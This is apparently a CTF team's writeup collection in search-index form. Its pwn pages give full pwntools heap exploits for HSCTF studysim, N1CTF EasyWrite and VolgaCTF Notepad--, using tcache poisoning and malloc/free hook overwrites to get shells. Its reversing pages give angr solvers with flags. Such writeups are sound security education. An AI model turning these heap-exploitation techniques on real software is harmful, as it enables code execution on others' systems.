bins but different one compared to the simple FD overwrites one would expect. So let\u2019s check it out! Along, with the challenge binary we were provided with Glibc 2.29 and loader for it. You can possibly use patchelf tool if your local environment is not of the one required for the challenge, so that your binary loads the Glibc 2.29 libc and the required loader for it. Carrying out the initial checksec step, we get the following information on the mitigations: Canary : Yes NX : Yes PIE : No Fortify : No RelRO : Full So possibly some overwrite on any of the hooks? A possible FSOP? Let\u2019s explore! The menu function which we are presented with: Welcome to study simulator! Because who has free time when you must STUDY. Commands: add - Adds a worksheet onto your stack of worksheets do - Complete the top worksheets sleep - Give up and sleep","title":"Studysim"},{"location":"pwning/HSCTF20/studysim/#add","text":"Let\u2019s us create a new chunk of any size below 0x400 and then the allocated chunk\u2019s address is then stored in an array called stack in .bss section. If the count of the chunks is already 7 then we cannot store anymore chunks but otherwise it simply increments the count variable. stack[allocated_count ++] = address of the allocated chunk After this we can give some content and it prints back the content which we have just added.","title":"Add"},{"location":"pwning/HSCTF20/studysim/#do","text":"Here comes the vulnerable part. The function asks the user to input any number of integer and reduces the value of allocated_count by that much value without any checks on the input value. Which means using this we can store our return allocated address anywhere on the .bss. This is how the .bss section looks like: 0x404020 stdout@@GLIBC_2.2.5 : 0x00007ffff7fc6760 0x0000000000000000 0x404030 stdin@@GLIBC_2.2.5 : 0x00007ffff7fc5a00 0x0000000000000000 0x404040 allocated_count : 0x0000000000000000 0x0000000000000000 0x404050: 0x0000000000000000 0x0000000000000000 0x404060 stack : 0x0000000000000000 0x0000000000000000 0x404070 stack+16 : 0x0000000000000000 0x0000000000000000 0x404080 stack+32 : 0x0000000000000000 0x0000000000000000 0x404090 stack+48 : 0x0000000000000000 0x0000000000000000","title":"Do"},{"location":"pwning/HSCTF20/studysim/#sleep","text":"Well, it just sleeps and exits. Nothing interesting here.","title":"Sleep"},{"location":"pwning/HSCTF20/studysim/#getting-the-leaks","text":"To get the heap leaks, we can invoke the Do() functionality and then reduce the allocated_count to a negative value such that the address of the heap chunk returned by the malloc function is stored on the allocated_count .bss address. As the binary prints out the value of allocated_count here we get the heap leaks. You throw the worksheet '0@@' on your stack of worksheets. For the libc leaks, well it won\u2019t be that easy as there\u2019s a size check and also no free() to invoke anywhere anyhow. As the libc addresses are stored on the .bss section we need to somehow get an allocation there (as the binary prints the content of the chunk). So now how do we control this? Here, comes the Tcache structure. I found this really good reference for understanding about how the Tcache keeps a track of the number of chunks in Tcache and their addresses. I won\u2019t be explaining it in detail; you can check out the resource mentioned and try checking out the structure in GDB by allocating and freeing chunks in Tcache for any program which allows you to do it. By calculating the right offset with the heap leaks and the known .bss address of the array stack one can get the allocation in the Tcache structure ( using the Do() functionality again ofc). First, we can overwrite the first 8 bytes of tcache_perthread_struct.count. And then similarly on the next allocation we can overwrite the first pointer stored in tcache_perthread_struct.entries (such that it acts as a freed chunk of size of 0x20 bytes). This pointer must have the .bss address of stdout_GLIBC stored as it\u2019s forward pointer. So on the next call on malloc you can get an allocation there and cleverly leak out the libc address stored! 0x1553000: 0x0000000000000000 0x0000000000000251 -- Tcache struct begins 0x1553010: 0x000000000155327f 0x0000000000000000 -- First 8 bytes overwritten with count 0x1553020: 0x0000000000000000 0x0000000000000000 0x1553030: 0x0000000000000000 0x0000000000000000 0x1553040: 0x0000000000000000 0x0000000000000000 0x1553050: 0x0000000000404030 0x0000000000000000 -- Next chunk in line for allocation 0x1553060: 0x0000000000000000 0x0000000000000000","title":"Getting the Leaks"},{"location":"pwning/HSCTF20/studysim/#final-exploit","text":"By using the same trick as for the libc leaks, we can trigger the final exploit. Like last time by cleverly getting an allocation on Tcache (probably a chunk of another size, as it might give SIGSEV) of a chunk with FD pointer set to malloc_hook . On the next call to malloc() function we would get an allocation on malloc_hook (exploiting the naive tcache). Now you can simply overwrite it with a one_gadget and on next malloc KABOOM!!! from pwn import * bss_stack = 0x404060 #k = process( ./studysim ,env = { LD_PRELOAD : ./libc.so.6 }) k = remote('pwn.hsctf.com', 5007) def add(size,content): k.sendlineafter( , add ) k.sendlineafter( worksheet?\\n ,str(size)) k.sendlineafter( worksheet?\\n ,content) def do(count): k.sendlineafter( , do ) k.sendlineafter( finish?\\n ,str(count)) def sleep(): k.sendlineafter( , sleep ) stdout_bss = 0x0000000000404030 #heap leaks do(4) add(0x10,'a'*0x10) do(0) k.recvuntil( Only ) heap_leak = int(k.recvline().strip().split( )[0],10)-1 print(hex(heap_leak)) do(heap_leak) #get a count chunk = heap_leak-0x250-0x8 diff = -bss_stack+chunk do(-diff/8) add(0x10,'c'*0x10) do(diff/8+1) #allocate a chunk at .bss addr of stdin chunk = heap_leak-0x208-0x10 diff = -bss_stack+chunk do(-diff/8) add(0x10,p64(stdout_bss)) do(diff/8+1) add(0x08,'') k.sendlineafter( , add ) k.sendlineafter( worksheet?\\n ,str(0x8)) k.sendlineafter( worksheet?\\n ,'a') k.recvuntil( worksheet ) leak = k.recvline().strip().split( )[0].replace( ' , ) leak = '\\x00'+leak[1:] leak = u64(leak.ljust(8,'\\x00')) libc_base = leak-0x1e4a00 print(hex(libc_base)) do(3) #allocate chunk at __malloc_hook malloc_hook = libc_base + 0x0000000001e4c30 system = libc_base + 0x0000000000052fd0 one_gadget = libc_base + 0xe2383 chunk = heap_leak-0x208-0x8 diff = -bss_stack+chunk do(-diff/8) add(0x20,p64(malloc_hook)) do(diff/8+1) add(0x08,'') k.sendlineafter( , add ) k.sendlineafter( worksheet?\\n ,str(0x8)) k.sendlineafter( worksheet?\\n ,p64(one_gadget)) do(2) #call system k.sendlineafter( , add ) k.sendlineafter( worksheet?\\n ,'0') k.interactive()","title":"Final Exploit"},{"location":"pwning/N1CTF20/easywrite/","text":"EasyWrite The past weekend I played N1CTF along with my teammates, I ended up spending most of the time in EasyWrite and Signin. In this writeup I\u2019ll be explaining about my approach for the EasyWrite, so let\u2019s get started! Initial Click All the useful mitigation are enabled other than FORTIFY. Also, the libc version required is libc-2.31. In a nutshell, the binary does the follows: Gives us the libc leak directly We can input 0x299 bytes which is stored on the heap [chunk1] Asks us to enter an address [addr1] where contents of chunk1 are copied to Allocated a chunk of size 0x30 [chunk2]. We can write 0x2f bytes to this chunk. chunk2 is freed. From this I could deduce that overwriting free_hook could be the key. But it wasn\u2019t really that easy. What did not work? On the first try, I gave addr1 as free_hook_ and the contents of chunk1 as address of system/ shellcode what not. I ended up with a SIGSEV because this was bound not to work as the binary was executing the chunk1 address and NX was enabled. I couldn\u2019t find any other targets for a long while. Another thing to try out was the controlling tcache structure because we could utilize the write happening on chunk2. Basically, we had to control malloc to help us in getting an arbitrary write. How about getting an allocation on free_hook_ and then overwriting it to get a shell? Not that easy. Crux: Controlling Tcache We know that it\u2019s the tcache_perthread_struct (stored on the heap) which kind of keeps a track of the count of chunks are present in the bin and also which one to be recycled on the next call. But in the present scenario we cannot control it because we do not have any way to get heap leaks but we have the libc leaks. Is there any way to control this region if we are armed only with libc leaks? I found a mmap\u2019d address which stores the pointer to the [tcache_perthread structure] -0x10 address. If we could overwrite this address with a chunk1 which has our fake tcache_structure (where the next 0x30 size chunk to be recycled is our free_hook_) then we could get the desired arbitrary write. In my understanding this mmap region is the global Tcache pointer which stores the pointer to the tcache structure (one stored on heap). More details can be found on another writeup on the same which gives a detailed understanding: https://ctftime.org/writeup/24295 . What happened next? Unfortunately, I was not able to complete the challenge during the CTF. Here, none of the one_gadgets come to handy so one must overwrite free_hook_ with system but then it would call free(system) = system(system) which is really not what we desire. My teammate and I did a lot of tries on this but found it out very late that one could get the arbitrary write at free_hook -0x8 and overwrite it with \u201c/bin/sh\\x00\u201d + libc_system_address. Nevertheless, this was a fun challenge as I really learned something new. Also, we must learn to read the source code when all the doors seem to be closed. Exploit from pwn import * p = process( ./easy ,env = { LD_PRELOAD : ./libc-2.31.so }) p.recvuntil( Here is your gift: ) leak = int(p.recvline().strip(),16) print(hex(leak)) libc_start = leak - 0x08ec50 log.info( libc_start = + hex(libc_start)) system = libc_start + 0x055410 free_hook = libc_start + 0x00000000001eeb28 tls_tcache = libc_start + 0x1f34f0 fake_tcache = p64(0x0000000100000000) + p64(0)0x82+p64(0)+ p64(free_hook-0x8) p.sendafter( Input your message: ,fake_tcache) p.sendafter( Where to write?: ,p64(tls_tcache)) p.sendafter( Any last message?: , /bin/sh\\x00 +p64(system)) p.interactive()","title":"EasyWrite"},{"location":"pwning/N1CTF20/easywrite/#easywrite","text":"The past weekend I played N1CTF along with my teammates, I ended up spending most of the time in EasyWrite and Signin. In this writeup I\u2019ll be explaining about my approach for the EasyWrite, so let\u2019s get started!","title":"EasyWrite"},{"location":"pwning/N1CTF20/easywrite/#initial-click","text":"All the useful mitigation are enabled other than FORTIFY. Also, the libc version required is libc-2.31. In a nutshell, the binary does the follows: Gives us the libc leak directly We can input 0x299 bytes which is stored on the heap [chunk1] Asks us to enter an address [addr1] where contents of chunk1 are copied to Allocated a chunk of size 0x30 [chunk2]. We can write 0x2f bytes to this chunk. chunk2 is freed. From this I could deduce that overwriting free_hook could be the key. But it wasn\u2019t really that easy.","title":"Initial Click"},{"location":"pwning/N1CTF20/easywrite/#what-did-not-work","text":"On the first try, I gave addr1 as free_hook_ and the contents of chunk1 as address of system/ shellcode what not. I ended up with a SIGSEV because this was bound not to work as the binary was executing the chunk1 address and NX was enabled. I couldn\u2019t find any other targets for a long while. Another thing to try out was the controlling tcache structure because we could utilize the write happening on chunk2. Basically, we had to control malloc to help us in getting an arbitrary write. How about getting an allocation on free_hook_ and then overwriting it to get a shell? Not that easy.","title":"What did not work?"},{"location":"pwning/N1CTF20/easywrite/#crux-controlling-tcache","text":"We know that it\u2019s the tcache_perthread_struct (stored on the heap) which kind of keeps a track of the count of chunks are present in the bin and also which one to be recycled on the next call. But in the present scenario we cannot control it because we do not have any way to get heap leaks but we have the libc leaks. Is there any way to control this region if we are armed only with libc leaks? I found a mmap\u2019d address which stores the pointer to the [tcache_perthread structure] -0x10 address. If we could overwrite this address with a chunk1 which has our fake tcache_structure (where the next 0x30 size chunk to be recycled is our free_hook_) then we could get the desired arbitrary write. In my understanding this mmap region is the global Tcache pointer which stores the pointer to the tcache structure (one stored on heap). More details can be found on another writeup on the same which gives a detailed understanding: https://ctftime.org/writeup/24295 .","title":"Crux: Controlling Tcache"},{"location":"pwning/N1CTF20/easywrite/#what-happened-next","text":"Unfortunately, I was not able to complete the challenge during the CTF. Here, none of the one_gadgets come to handy so one must overwrite free_hook_ with system but then it would call free(system) = system(system) which is really not what we desire. My teammate and I did a lot of tries on this but found it out very late that one could get the arbitrary write at free_hook -0x8 and overwrite it with \u201c/bin/sh\\x00\u201d + libc_system_address. Nevertheless, this was a fun challenge as I really learned something new. Also, we must learn to read the source code when all the doors seem to be closed.","title":"What happened next?"},{"location":"pwning/N1CTF20/easywrite/#exploit","text":"from pwn import * p = process( ./easy ,env = { LD_PRELOAD : ./libc-2.31.so }) p.recvuntil( Here is your gift: ) leak = int(p.recvline().strip(),16) print(hex(leak)) libc_start = leak - 0x08ec50 log.info( libc_start = + hex(libc_start)) system = libc_start + 0x055410 free_hook = libc_start + 0x00000000001eeb28 tls_tcache = libc_start + 0x1f34f0 fake_tcache = p64(0x0000000100000000) + p64(0)0x82+p64(0)+ p64(free_hook-0x8) p.sendafter( Input your message: ,fake_tcache) p.sendafter( Where to write?: ,p64(tls_tcache)) p.sendafter( Any last message?: , /bin/sh\\x00 +p64(system)) p.interactive()","title":"Exploit"},{"location":"pwning/VolgaCTF20/notepad/","text":"Notepad-- This 300 pointer challenge was the solo Pwn challenge in VolgaCTF and I solved it just after the CTF ended :(. The following exploit is tested on a Ubuntu 18.04 VM. Here\u2019s the description of the challenge: Notepad\u2013 is the app to store your most private notes, with an extremely lightweight UI. Check it out! We are just given the challenge binary for this challenge. Also, the 64-bit dynamically linked stripped binary had all the protections enabled other than FORTIFY. Reversing The Notepad application presents us a menu function which looks like: Welcome to Notepad-- Pick an existing notebook or create a new one [p]ick notebook [a]dd notebook [d]elete notebook [l]ist notebook [q]uit The structure of the notebook and tab is as follows, struct notebook { char name[16]; int number_of_tabs; struct tab tabs[64]; } struct tabs { char name[16]; int size; char* content; } So the functionality allows you to pick a notebook by giving the index as index_of_notebook + 1 and to try out the functionalities of tabs. Operations with notebook aaaaaaa [a]dd tab [v]iew tab [u]pdate tab [d]elete tab [l]ist tabs [q]uit This let\u2019s you add a tab, view the data in each tab ( (len(data_it_prints) is equal to tab- size) , list all the names of tabs in a notebook, delete a tab and go back to the previous menu. So hoping that the functionalities of the binary is clear let\u2019s move on! Vulnerability and the exploit Getting the leaks As the libc is not given and as PIE and RELRO are fully enabled the best way to get the leaks here is to allocate an unsorted bin chunk, free it and view it. As the binary uses malloc() the libc pointers are retained after allocation provided we give an empty content. Here\u2019s what I did: Allocated a chunk of size 0x500 bytes so that after freeing it goes to the unsorted bin Deleted the chunk using delete_tab functionality Allocated another chunk of size 0x20. Malloc would split the previous chunk and allocate me a chunk of 0x30 size (0x10 for the header). The allocated chunk had the first 2 0x8 bytes set to a libc pointer Did a view and got the leaks by calculating the offsets Mind you, I did this locally and not on the server. To get which libc the binary is using you might have to look up the last 3 nibbles in the libc database to get the libc version the challenge is using! Overwriting the free_hook The first obvious bug in the binary is the manner in how it takes in the name of the notebook and the tab. It takes the input through scanf( \u201c%s\u201d, name) which makes it obvious that it is prone to the classic buffer overflow! Here\u2019s the code snippet of the add_notebook functionality: int add_notebook() { __int64 v1; // rax char *v2; // ST08_8 if ( nb_ctr == 16 ) return puts( You've reached the limit for notebooks! Delete some of the older once first! ); v1 = nb_ctr++; v2 = (char *) table + 2072 * v1; printf( Enter notebook name: ); return __isoc99_scanf( %s , v2); } Now, that you have got the leaks you can find the address of free_hook which is a libc pointer that is invoked when the program calls free(chunk). To carry out the final exploit our aim is now to overwrite the free_hook. To do this we do have to explore another vulnerability which lies in the update_tab functionality. Update_tab function let\u2019s you update any tab of the index lesser than notebook- number_of_tabs. Enter index of tab to update: 1 Enter new tab name (leave empty to skip): Enter new data length (leave empty to keep the same): Enter the data: And as you can see in above if the new length is same as the previous it just simply lets you update the content pointed by the data pointer. Otherwise, it frees the current data pointer and calls a malloc() with a size. What if I could overwrite tabs- data pointer with free_hook and call an update functionality without giving a different size? Let\u2019s see what we can do! Add another note (as first one was used for the leaks) and using scanf(\u201c%s\u201d,name) overflow junk in place of name but overwrite size with a valid size and data pointer with free_hook. Pick that note and update tab with index 1. As discussed above, leave data length empty, point free_hook to system(). Free a chunk holding the string \u201c/bin/sh\\x00\u201d and BOOM!!! Exploit Code from pwn import * r = process('./notepad') # notebook functionalities def add_note(name): r.sendlineafter(' ','a') r.sendlineafter('name: ',name) def pick_note(): #display items r.sendlineafter(' ','l') def dele_note(idx): r.sendlineafter(' ','d') r.sendlineafter('Enter index of a notebook to delete:',str(idx)) def pick_note(idx): r.sendlineafter(' ','p') r.sendlineafter('pick: ',str(idx)) #tab functionalities def add_tab(name,length,data): r.sendlineafter(' ','a') r.sendlineafter('name: ',name) r.sendlineafter('Enter data length (in bytes): ',str(length)) r.sendlineafter('data: ',data) def view_tab(idx): r.sendlineafter(' ','v') r.sendlineafter('view: ',str(idx)) def list_tab(): r.sendlineafter(' ','l') def update_tab(idx,name,length,data): r.sendlineafter(' ','u') r.sendlineafter('update: ',str(idx)) r.sendlineafter('skip): ',name) r.sendlineafter('same): ',str(length)) r.sendlineafter('data: ',data) def del_tab(idx): r.sendlineafter(' ','d') r.sendlineafter('delete: ',str(idx)) def quit_tab(): r.sendlineafter(' ','q') add_note('a'*0x10) pick_note(1) add_tab('b'*0x10,0x500, '') add_tab('c'*0x10,0x10,'/bin/sh\\x00') del_tab(1) add_tab('d'*0x10,0x20,'') view_tab(2) print(r.recvline()) rcvd = r.recvline() leak = u64('\\xd0'+rcvd[:7]) libc_base = leak - 0x3ec0d0 quit_tab() #leaked pointers free_hook = libc_base + 0x3ed8e8 system = libc_base + 0x4f440 #final exploit sizeof_nb = 0x818 offset_tab = 0x18 offset_data = 0x18 sizeof_filler = offset_tab+offset_data-0x8 filler = b'a'*(sizeof_filler)+p64(0x30) add_note(filler+p64(free_hook)) pick_note(2) update_tab(1,'b'*0x8,'',p64(system)) print(hex(free_hook)) print(hex(libc_base)) quit_tab() pick_note(1) del_tab(1) #gdb.attach(r) r.interactive() The challenge was a simple yet interesting one! I got a shell locally for this but was too late to try it on the server and get the flag. Anyways, I\u2019m glad I could solve it!","title":"Notepad--"},{"location":"pwning/VolgaCTF20/notepad/#notepad-","text":"This 300 pointer challenge was the solo Pwn challenge in VolgaCTF and I solved it just after the CTF ended :(. The following exploit is tested on a Ubuntu 18.04 VM. Here\u2019s the description of the challenge: Notepad\u2013 is the app to store your most private notes, with an extremely lightweight UI. Check it out! We are just given the challenge binary for this challenge. Also, the 64-bit dynamically linked stripped binary had all the protections enabled other than FORTIFY.","title":"Notepad--"},{"location":"pwning/VolgaCTF20/notepad/#reversing","text":"The Notepad application presents us a menu function which looks like: Welcome to Notepad-- Pick an existing notebook or create a new one [p]ick notebook [a]dd notebook [d]elete notebook [l]ist notebook [q]uit The structure of the notebook and tab is as follows, struct notebook { char name[16]; int number_of_tabs; struct tab tabs[64]; } struct tabs { char name[16]; int size; char* content; } So the functionality allows you to pick a notebook by giving the index as index_of_notebook + 1 and to try out the functionalities of tabs. Operations with notebook aaaaaaa [a]dd tab [v]iew tab [u]pdate tab [d]elete tab [l]ist tabs [q]uit This let\u2019s you add a tab, view the data in each tab ( (len(data_it_prints) is equal to tab- size) , list all the names of tabs in a notebook, delete a tab and go back to the previous menu. So hoping that the functionalities of the binary is clear let\u2019s move on!","title":"Reversing"},{"location":"pwning/VolgaCTF20/notepad/#vulnerability-and-the-exploit","text":"","title":"Vulnerability and the exploit"},{"location":"pwning/VolgaCTF20/notepad/#getting-the-leaks","text":"As the libc is not given and as PIE and RELRO are fully enabled the best way to get the leaks here is to allocate an unsorted bin chunk, free it and view it. As the binary uses malloc() the libc pointers are retained after allocation provided we give an empty content. Here\u2019s what I did: Allocated a chunk of size 0x500 bytes so that after freeing it goes to the unsorted bin Deleted the chunk using delete_tab functionality Allocated another chunk of size 0x20. Malloc would split the previous chunk and allocate me a chunk of 0x30 size (0x10 for the header). The allocated chunk had the first 2 0x8 bytes set to a libc pointer Did a view and got the leaks by calculating the offsets Mind you, I did this locally and not on the server. To get which libc the binary is using you might have to look up the last 3 nibbles in the libc database to get the libc version the challenge is using!","title":"Getting the leaks"},{"location":"pwning/VolgaCTF20/notepad/#overwriting-the-free_hook","text":"The first obvious bug in the binary is the manner in how it takes in the name of the notebook and the tab. It takes the input through scanf( \u201c%s\u201d, name) which makes it obvious that it is prone to the classic buffer overflow! Here\u2019s the code snippet of the add_notebook functionality: int add_notebook() { __int64 v1; // rax char *v2; // ST08_8 if ( nb_ctr == 16 ) return puts( You've reached the limit for notebooks! Delete some of the older once first! ); v1 = nb_ctr++; v2 = (char *) table + 2072 * v1; printf( Enter notebook name: ); return __isoc99_scanf( %s , v2); } Now, that you have got the leaks you can find the address of free_hook which is a libc pointer that is invoked when the program calls free(chunk). To carry out the final exploit our aim is now to overwrite the free_hook. To do this we do have to explore another vulnerability which lies in the update_tab functionality. Update_tab function let\u2019s you update any tab of the index lesser than notebook- number_of_tabs. Enter index of tab to update: 1 Enter new tab name (leave empty to skip): Enter new data length (leave empty to keep the same): Enter the data: And as you can see in above if the new length is same as the previous it just simply lets you update the content pointed by the data pointer. Otherwise, it frees the current data pointer and calls a malloc() with a size. What if I could overwrite tabs- data pointer with free_hook and call an update functionality without giving a different size? Let\u2019s see what we can do! Add another note (as first one was used for the leaks) and using scanf(\u201c%s\u201d,name) overflow junk in place of name but overwrite size with a valid size and data pointer with free_hook. Pick that note and update tab with index 1. As discussed above, leave data length empty, point free_hook to system(). Free a chunk holding the string \u201c/bin/sh\\x00\u201d and BOOM!!!","title":"Overwriting the free_hook"},{"location":"pwning/VolgaCTF20/notepad/#exploit-code","text":"from pwn import * r = process('./notepad') # notebook functionalities def add_note(name): r.sendlineafter(' ','a') r.sendlineafter('name: ',name) def pick_note(): #display items r.sendlineafter(' ','l') def dele_note(idx): r.sendlineafter(' ','d') r.sendlineafter('Enter index of a notebook to delete:',str(idx)) def pick_note(idx): r.sendlineafter(' ','p') r.sendlineafter('pick: ',str(idx)) #tab functionalities def add_tab(name,length,data): r.sendlineafter(' ','a') r.sendlineafter('name: ',name) r.sendlineafter('Enter data length (in bytes): ',str(length)) r.sendlineafter('data: ',data) def view_tab(idx): r.sendlineafter(' ','v') r.sendlineafter('view: ',str(idx)) def list_tab(): r.sendlineafter(' ','l') def update_tab(idx,name,length,data): r.sendlineafter(' ','u') r.sendlineafter('update: ',str(idx)) r.sendlineafter('skip): ',name) r.sendlineafter('same): ',str(length)) r.sendlineafter('data: ',data) def del_tab(idx): r.sendlineafter(' ','d') r.sendlineafter('delete: ',str(idx)) def quit_tab(): r.sendlineafter(' ','q') add_note('a'*0x10) pick_note(1) add_tab('b'*0x10,0x500, '') add_tab('c'*0x10,0x10,'/bin/sh\\x00') del_tab(1) add_tab('d'*0x10,0x20,'') view_tab(2) print(r.recvline()) rcvd = r.recvline() leak = u64('\\xd0'+rcvd[:7]) libc_base = leak - 0x3ec0d0 quit_tab() #leaked pointers free_hook = libc_base + 0x3ed8e8 system = libc_base + 0x4f440 #final exploit sizeof_nb = 0x818 offset_tab = 0x18 offset_data = 0x18 sizeof_filler = offset_tab+offset_data-0x8 filler = b'a'*(sizeof_filler)+p64(0x30) add_note(filler+p64(free_hook)) pick_note(2) update_tab(1,'b'*0x8,'',p64(system)) print(hex(free_hook)) print(hex(libc_base)) quit_tab() pick_note(1) del_tab(1) #gdb.attach(r) r.interactive() The challenge was a simple yet interesting one! I got a shell locally for this but was too late to try it on the server and get the flag. Anyways, I\u2019m glad I could solve it!","title":"Exploit Code"},{"location":"reversing/intro/","text":"Reversing Introduction The following are the Links to the writeups to the challenges we have solved from CTF's from the Reverse Engineering category. The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. Byte Bandits 2020 Auto Bot Baby rust HSCTF7 2020 Dis - By @sandrabeme APLab:Statistics - By @sandrabeme APLab:English - By @sandrabeme APLab:ComputerScience - By @namithas123 DarkCTF Jack - By @sandrabeme","title":"Reversing"},{"location":"reversing/intro/#reversing","text":"","title":"Reversing"},{"location":"reversing/intro/#introduction","text":"The following are the Links to the writeups to the challenges we have solved from CTF's from the Reverse Engineering category.","title":"Introduction"},{"location":"reversing/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. Byte Bandits 2020 Auto Bot Baby rust HSCTF7 2020 Dis - By @sandrabeme APLab:Statistics - By @sandrabeme APLab:English - By @sandrabeme APLab:ComputerScience - By @namithas123 DarkCTF Jack - By @sandrabeme","title":"The contents of this repo"},{"location":"reversing/ByteBandits20/auto_bot/","text":"Auto_bot Challenge was solved by: Sandra and Ashwathi When we connected to the server we got a base64 encoded binary. Using bash we recieved the decoded binary and anylised it. But each time it was a new binary. Heres the scritp from pwn import * import base64 import subprocess import angr import sys r = remote('pwn.byteband.it', 6000) flag = open('flag.txt', 'w') while(1): o = r.recvuntil( \\n ) flag.write(str(o)) out = base64.b64decode(o) n=open( new , wb ) n.write(out) n.close() subprocess.call(['chmod','+x','new']) project = angr.Project( ./new ) initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state) simulation.explore(find = lambda s: b good job in s.posix.dumps(1) in s.posix.dumps(1)) if simulation.found: solution_state=simulation.found[0] r.sendline(solution_state.posix.dumps(sys.stdin.fileno())) #in = inp[2:len(inp)-1] else: raise Exception('could not find solution:') #r.sendline(in) #flag{0pt1mus_pr1m3_has_chosen_you}","title":"Auto_bot"},{"location":"reversing/ByteBandits20/auto_bot/#auto_bot","text":"Challenge was solved by: Sandra and Ashwathi When we connected to the server we got a base64 encoded binary. Using bash we recieved the decoded binary and anylised it. But each time it was a new binary. Heres the scritp from pwn import * import base64 import subprocess import angr import sys r = remote('pwn.byteband.it', 6000) flag = open('flag.txt', 'w') while(1): o = r.recvuntil( \\n ) flag.write(str(o)) out = base64.b64decode(o) n=open( new , wb ) n.write(out) n.close() subprocess.call(['chmod','+x','new']) project = angr.Project( ./new ) initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state) simulation.explore(find = lambda s: b good job in s.posix.dumps(1) in s.posix.dumps(1)) if simulation.found: solution_state=simulation.found[0] r.sendline(solution_state.posix.dumps(sys.stdin.fileno())) #in = inp[2:len(inp)-1] else: raise Exception('could not find solution:') #r.sendline(in) #flag{0pt1mus_pr1m3_has_chosen_you}","title":"Auto_bot"},{"location":"reversing/ByteBandits20/baby_rust/","text":"Baby_Rust Analysing it dynamically gets us to xoring instructions: d = adhmp`badO|sL}JuvvFmiui{@IO}QQVR k=0 for i in d: s=s+chr(ord(i)^(7+k)) k=k+1 print(s) #flag{look_ma_i_can_write_in_rust}","title":"Baby_Rust"},{"location":"reversing/ByteBandits20/baby_rust/#baby_rust","text":"Analysing it dynamically gets us to xoring instructions: d = adhmp`badO|sL}JuvvFmiui{@IO}QQVR k=0 for i in d: s=s+chr(ord(i)^(7+k)) k=k+1 print(s) #flag{look_ma_i_can_write_in_rust}","title":"Baby_Rust"},{"location":"reversing/DarkCTF/Jack/","text":"Emojis - Misc HSCTF2020 Description We are given a binary which takes a string input and multiple math checks are performed on the input and had a good address which had to be achieved. The solution was obtained using a simple angr find and avoid script. Solution Script import angr import claripy import sys proj=angr.Project('./jack',load_options={'auto_load_libs':False},main_opts={'base_addr':0x400000}) flag=[claripy.BVS('flag%i'%i,8) for i in range(16)] flag_concat=claripy.Concat(*flag + [claripy.BVV( \\n )]) state=proj.factory.entry_state(stdin=flag_concat) for i in flag: state.solver.add(i =32) state.solver.add(i =127) simgr=proj.factory.simgr(state) simgr.explore(find=0x401489,avoid=[0x4012B3, 0x401468]) if simgr.found: simulation=simgr.found[0] print(simulation.posix.dumps(sys.stdin.fileno())) else: print( FAILURE ) Output n0_5ymb0l1c,3x30 This output was enclosed in the flagformat and submitted","title":"Emojis - Misc HSCTF2020"},{"location":"reversing/DarkCTF/Jack/#emojis-misc-hsctf2020","text":"","title":"Emojis - Misc HSCTF2020"},{"location":"reversing/DarkCTF/Jack/#description","text":"We are given a binary which takes a string input and multiple math checks are performed on the input and had a good address which had to be achieved. The solution was obtained using a simple angr find and avoid script.","title":"Description"},{"location":"reversing/DarkCTF/Jack/#solution-script","text":"import angr import claripy import sys proj=angr.Project('./jack',load_options={'auto_load_libs':False},main_opts={'base_addr':0x400000}) flag=[claripy.BVS('flag%i'%i,8) for i in range(16)] flag_concat=claripy.Concat(*flag + [claripy.BVV( \\n )]) state=proj.factory.entry_state(stdin=flag_concat) for i in flag: state.solver.add(i =32) state.solver.add(i =127) simgr=proj.factory.simgr(state) simgr.explore(find=0x401489,avoid=[0x4012B3, 0x401468]) if simgr.found: simulation=simgr.found[0] print(simulation.posix.dumps(sys.stdin.fileno())) else: print( FAILURE )","title":"Solution Script"},{"location":"reversing/DarkCTF/Jack/#output","text":"n0_5ymb0l1c,3x30 This output was enclosed in the flagformat and submitted","title":"Output"},{"location":"reversing/HSCTF7/APLabEnglish/","text":"APLab:English Description Another java Reversing Challenge. We are given a java file which is to be reversed. Solution s= 1dd3|y_3tttb5g\\`q]^dhn3j def unxor(string): ret='' xorstr=[4,1,3,1,2,1,3,0,1,4,3,1,2,0,1,4,1,2,3,2,1,0,3] for i in range(len(string)): ret+=chr(ord(string[i])^xorstr[i]) return ret def untranspose(string): ret=[None]\\*23 transpose=[11,18,15,19,8,17,5,2,12,6,21,0,22,7,13,14,4,16,20,1,3,10,9] for i in range(len(transpose)): ret[transpose[i]]=string[i] return ''.join(ret) for i in range(3): s=unxor(s) print(s) s=untranspose(s) print(s) Output 5eg2~x\\3upwc7gau\\\\gjo3i cj3o\\\\pg~i35uaug\\xe2gw7 gk0n^]sgm04watc]zf0fw4 40gf]sma^4wgtc0z]knf0w 01dg_rna_0tf}tb4{_hlg0t flag{n0t_t00_b4d_r1ght}","title":"APLab:English"},{"location":"reversing/HSCTF7/APLabEnglish/#aplabenglish","text":"","title":"APLab:English"},{"location":"reversing/HSCTF7/APLabEnglish/#description","text":"Another java Reversing Challenge. We are given a java file which is to be reversed.","title":"Description"},{"location":"reversing/HSCTF7/APLabEnglish/#solution","text":"s= 1dd3|y_3tttb5g\\`q]^dhn3j def unxor(string): ret='' xorstr=[4,1,3,1,2,1,3,0,1,4,3,1,2,0,1,4,1,2,3,2,1,0,3] for i in range(len(string)): ret+=chr(ord(string[i])^xorstr[i]) return ret def untranspose(string): ret=[None]\\*23 transpose=[11,18,15,19,8,17,5,2,12,6,21,0,22,7,13,14,4,16,20,1,3,10,9] for i in range(len(transpose)): ret[transpose[i]]=string[i] return ''.join(ret) for i in range(3): s=unxor(s) print(s) s=untranspose(s) print(s)","title":"Solution"},{"location":"reversing/HSCTF7/APLabEnglish/#output","text":"5eg2~x\\3upwc7gau\\\\gjo3i cj3o\\\\pg~i35uaug\\xe2gw7 gk0n^]sgm04watc]zf0fw4 40gf]sma^4wgtc0z]knf0w 01dg_rna_0tf}tb4{_hlg0t flag{n0t_t00_b4d_r1ght}","title":"Output"},{"location":"reversing/HSCTF7/ComputerScience/","text":"APLab:Computer Science principle HSCTF Description A java RE challenge from HSCTF 2020 The challenge gives a simple java code ,which basically takes in an input of length 18, if (inp.length()!=18) { System.out.println( Your input is incorrect. ); System.exit(0) } Convert it to a string through different functions inp=shift2(shift(inp)); where shift2(): public static String shift2(String input) { String ret = ; for (int i = 0; i input.length(); i++) { ret+=(char)(input.charAt(i)+ Integer.toString((int)input.charAt(i)).length()); } System.out.println(ret); return ret; } Shift(): 